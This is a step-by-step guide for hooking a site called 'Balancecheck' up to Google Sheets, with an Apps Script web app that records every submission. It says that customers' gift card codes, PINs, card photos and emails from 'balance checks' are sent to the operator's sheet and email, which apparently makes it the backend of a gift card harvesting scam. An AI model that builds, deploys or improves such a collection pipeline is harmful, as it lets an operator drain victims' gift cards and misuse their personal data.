Google Sheets Setup

Connect your Balancecheck site to Google Sheets so every order appears in a spreadsheet you control.

Step 1 — Create the Sheet

  1. Go to sheets.google.com and create a new spreadsheet.
  2. Name it Balancecheck Orders.
  3. In Row 1, add these column headers:
    Date Type Brand Region Value Code PIN Email Status

Step 2 — Create the Apps Script

  1. In your spreadsheet, go to Extensions → Apps Script.
  2. Delete any code in the editor and paste the script below.
  3. Click Save (💾).
function doPost(e) {
  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
  var data = JSON.parse(e.postData.contents);

  sheet.appendRow([
    new Date().toISOString(),
    data.type || "",
    data.brand || "",
    data.region || "",
    data.value || "",
    data.code || "",
    data.pin || "",
    data.email || "",
    "Pending"
  ]);

  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok" }))
    .setMimeType(ContentService.MimeType.JSON);
}

function doGet() {
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ready" }))
    .setMimeType(ContentService.MimeType.JSON);
}

Step 3 — Deploy as Web App

  1. In Apps Script, click Deploy → New deployment.
  2. Click the ⚙️ gear next to "Select type" → choose Web app.
  3. Set:
    • Execute as: Me
    • Who has access: Anyone
  4. Click Deploy.
  5. Click Authorize access and allow the permissions.
  6. Copy the Web app URL — it looks like:
    https://script.google.com/macros/s/AKfyc.../exec

Step 4 — Paste the URL in the Wallet Page

  1. Open your Balancecheck site and go to Wallet.
  2. Paste the Web app URL into the "Google Sheets URL" field.
  3. Click Save.
  4. Every order will now appear in your spreadsheet automatically.

How It Works

CHECK When a customer submits a balance check, the card code, PIN, photo, and their email are sent to your sheet + your email.

BUY When a customer buys a card, the brand, amount, and their email appear in your sheet. You send the gift card to their email manually.

STATUS Mark the "Status" column as Delivered in the sheet once you've sent the card.

Tips

  • Sort the sheet by Date (newest first) to see recent orders on top.
  • Use conditional formatting on the Status column: green for "Delivered", yellow for "Pending".
  • You can add a notification rule in Google Sheets (Tools → Notification rules) to get emailed when a new row is added.
